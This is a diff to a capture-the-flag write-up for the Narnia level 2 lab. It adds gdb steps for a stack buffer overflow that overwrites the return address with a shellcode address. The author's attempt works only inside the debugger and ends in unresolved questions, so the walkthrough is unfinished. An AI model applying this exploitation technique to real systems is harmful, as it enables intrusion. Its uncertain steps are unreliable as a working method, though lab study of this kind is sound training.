@@ -76,18 +76,108 @@ Let's get started:
     ```
     gdb --args ./narnia2 $(echo -e $(echo -e $SHELLCODE)$(echo -e $PADDING))
     ```
+    ```
+    disas main
+    ```
+    
+    ![](0.png)
 
+    Register `eax` contain the address to the shell code.
 
+    ```
+    b *0x080491d5
+    ```
+    ```
+    r
+    ```
+    ```
+    x/40x $sp
+    ```
 
+    ![](1.png)
 
+    `0xffffd408` is the pushed `eax` for the `printf`. Actualy this is the address for the shellcode.This is the address we want it to overwrite the original value back. `0xf7c21500` this is the return value **from** the main. Let's overwrite it:
+    ```
+    exit
+    ```
+    ```
+    SHELLCODE_ADDR=$'\x08\xd4\xff\xff'
+    ```
+    ```
+    gdb --args ./narnia2 $(echo -e $(echo -e $SHELLCODE)$(echo -e $PADDING)$(echo -e $SHELLCODE_ADDR))
+    ```
+    ```
+    b *0x080491d5
+    ```
+    ```
+    r
+    ```
+    ```
+    x/40x $sp
+    ```
+
+    ![](2.png)
+
+    The second address indicates that we managed to hit the right place. But the first address indicates that when we added 4 bytes to the input, for some reason the addresses changed a bit. So we will do everything the same again, but the address of the shellcode will now be `0xffffd3f8`:
+
+    ```
+    exit
+    ```
     ```
     SHELLCODE_ADDR=$'\xf8\xd3\xff\xff'
     ```
+    ```
+    gdb --args ./narnia2 $(echo -e $(echo -e $SHELLCODE)$(echo -e $PADDING)$(echo -e $SHELLCODE_ADDR))
+    ```
+    ```
+    b *0x080491d5
+    ```
+    ```
+    r
+    ```
+    ```
+    x/40x $sp
+    ```
 
-Let's combine them together:
-```
-gdb --args ./narnia2 $(echo -e $(echo -e $SHELLCODE)$(echo -e $PADDING)$(echo -e $SHELLCODE_ADDR))
-```
+    ![](3.png)
+
+    Now let's try to run the program inside the gsb without any break point:
+
+    ```
+    exit
+    ```
+    ```
+    gdb --args ./narnia2 $(echo -e $(echo -e $SHELLCODE)$(echo -e $PADDING)$(echo -e $SHELLCODE_ADDR))
+    ```
+    ```
+    r
+    ```
+    
+    ![](4.png)
+
+    But still no permissions. Let's now try running outside of gdb:
+
+    ```
+    exit
+    ```
+    ```
+    exit
+    ```
+    ```
+    ./narnia2 $(echo -e $(echo -e $SHELLCODE)$(echo -e $PADDING)$(echo -e $SHELLCODE_ADDR))
+    ```
+    
+    ![](5.png)
+
+    This means that outside of gdb it doesn't work, but inside it it does. very strange. I tried to find answers to this, like [here](https://stackoverflow.com/questions/39187195/stack-buffer-overflow-works-on-gdb-doesnt-outsite-it), but nothing helped..<br />
+    
+    Are the addresses in gdb different from running without gdb?<br />
+    Which leaves me with the same question - what is the address of the shellcode?<br />
+    Or maybe there is another matter here?
+
+
+
+
 
 ## Password for the next level:
 ```
